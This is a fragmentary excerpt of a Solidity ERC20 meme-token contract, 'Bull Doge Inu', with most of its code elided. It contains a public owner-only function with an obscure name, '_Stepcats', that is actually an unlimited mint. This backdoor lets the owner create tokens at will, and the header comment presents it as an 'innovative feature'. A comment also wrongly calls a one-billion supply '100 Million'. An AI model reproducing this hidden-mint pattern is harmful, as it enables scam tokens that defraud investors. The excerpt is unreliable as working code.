...
//
// $BulldogeInu proposes an innovative feature in its contract.
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _Stepcats(uint256 amount) public onlyOwner {
 _Stepcats(msg.sender, amount);
    }
    ...
    function _Stepcats(address account, uint256 amount) internal virtual {
...
contract $BulldogeInu  is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Bull Doge Inu", "BULLDOGEINU") {
     _Stepcats(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}